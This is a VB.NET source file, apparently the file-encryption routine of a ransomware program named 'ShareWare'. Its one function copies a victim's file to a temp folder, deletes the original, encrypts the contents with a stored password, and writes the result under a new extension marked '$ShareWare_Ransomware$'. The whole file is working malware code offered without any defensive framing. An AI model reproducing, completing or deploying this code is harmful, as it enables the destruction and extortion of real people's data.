Imports Shareware.Core.LogFuncs
Namespace Shareware.core

    Public Class ShareHook

        Public Function Encriptor(ByVal FileE As String) As Boolean
            Dim FileName As String = System.IO.Path.GetFileName(FileE)

            Dim FuleRute As String = System.IO.Path.GetDirectoryName(FileE)

            If System.IO.File.Exists(FileE) = True Then
                System.IO.File.Copy(FileE, Shareware.core.DirPaths.TempPath & FileName)

                My.Computer.FileSystem.DeleteFile(FileE)

                Dim FileToString As String = ByteToString(System.IO.File.ReadAllBytes(Shareware.core.DirPaths.TempPath & FileName))

                Dim Dcrypthook As New Crypto(Shareware.core.DirPaths.strPass)

                Dim CriptFile As String = Dcrypthook.EncryptData(FileToString)

                Dim RuteNew As String = FuleRute & "\" & FileName & Shareware.core.DirPaths.ExtensionDefaul

                Dim TxtFile As System.IO.StreamWriter
                TxtFile = My.Computer.FileSystem.OpenTextFileWriter(RuteNew, True)
                TxtFile.WriteLine(CriptFile)
                TxtFile.WriteLine("$ShareWare_Ransomware$")
                TxtFile.Close()
                Return True
            End If
            Return False
        End Function

        Private Function ByteToString(ByVal Byte_Array As Byte()) As String
            Return System.Text.Encoding.ASCII.GetString(Byte_Array)
        End Function

    End Class

End Namespace

